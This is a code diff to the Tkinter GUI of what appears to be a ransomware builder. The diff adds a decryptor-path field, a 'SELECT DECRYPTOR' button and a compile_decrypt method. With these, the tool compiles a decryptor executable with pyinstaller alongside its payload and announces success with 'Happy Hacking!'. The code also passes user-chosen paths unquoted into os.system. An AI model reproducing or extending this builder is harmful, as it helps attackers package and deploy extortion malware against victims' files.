@@ -164,6 +164,7 @@ class MainWindow(Tk):
             'type' : StringVar(),
             'icon_path' : StringVar(),
             'payload_path' : StringVar(),
+            'decryptor_path' : StringVar(),
             'msg' : StringVar(),
             'new_msg' : StringVar(),
             'img_base64' : StringVar(),
@@ -500,6 +501,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         if os.path.isfile('./payload.py'):
             self.options['payload_path'].set('./payload.py')
 
+        if os.path.isfile('./decryptor.py'):
+            self.options['decryptor_path'].set('./decryptor.py')
+
         msg = LabelFrame(self.comp, text = 'Message', relief = GROOVE)
         msg.grid(row = 0, column = 0, columnspan = 3, sticky = 'w')
         Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on.' % platform.system(), background = 'white', font='Helvetica 16').grid(row = 0, column = 0)
@@ -520,6 +524,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
         Entry(sett_frame, textvariable = self.options['payload_path'], width = 50).grid(row = 1, column = 0)
         set_payload = Button(sett_frame, text = "SELECT PAYLOAD", command = self.select_payload, width = 15).grid(row = 1, column = 1)
+        Entry(sett_frame, textvariable = self.options['decryptor_path'], width = 50).grid(row = 2, column = 0)
+        set_decryptor = Button(sett_frame, text = "SELECT DECRYPTOR", command = self.select_decryptor, width = 15).grid(row = 2, column = 1)
 
         opt_frame = LabelFrame(self.comp, text = 'Finishing')
         opt_frame.grid(row = 2, column = 0, columnspan = 2)
@@ -580,17 +586,63 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             else:
                 os.system('%s -F -w %s %s %s %s' % (py, tk, crypto, pyaes, self.options['payload_path'].get()))
 
+            if os.path.isfile('./decryptor.py'):
+                ask = messagebox.askyesno('Found decryptor!', 'Compile decryptor now?')
+                if ask == False:
+                    messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+                    self.comp.destroy()
+                elif ask == True:
+                    self.compile_decrypt()
+            else:
+                return messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+
+        except Exception as e:
+            messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)
+
+    def compile_decrypt(self):
+        try:
+            decrypt = open(self.options['decryptor_path'].get()).read()
+        except FileNotFoundError:
+            return messagebox.showerror('ERROR', 'File does not exist, check decryptor path!')
+
+        try:
+            if self.options['os'].get() == 'windows':
+                py = 'pyinstaller.exe'
+            else:
+                py = 'pyinstaller'
+
+            if not 'from tkinter.ttk import' in decrypt:
+                tk = ''
+            else:
+                tk = '--hidden-import tkinter --hiddenimport tkinter.ttk --hidden-import io'
+
+            if not 'from Crypto import Random' in decrypt:
+                crypto = ''
+            else:
+                crypto = '--hidden-import pycryptodome'
+
+            if not 'import pyaes' in decrypt:
+                pyaes = ''
+            else:
+                pyaes = '--hidden-import pyaes'
+
+            os.system('%s -F -w %s %s %s %s' % (py, tk, crypto, pyaes, self.options['decryptor_path'].get()))
+
             messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
             self.comp.destroy()
 
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)
 
+
     def select_icon(self):
         self.options['icon_path'].set(askopenfilename(initialdir = "./", title = 'Select Icon...', filetypes = (('Icon Files', '*.ico'), ('All Files', '*.*'))))
 
     def select_payload(self):
         self.options['payload_path'].set(askopenfilename(initialdir = "./", title = 'Select Payload...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))
+
+    def select_decryptor(self):
+        self.options['decryptor_path'].set(askopenfilename(initialdir = "./", title = 'Select Decryptor...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))
 
     def generate(self):
         self.gen = Toplevel()
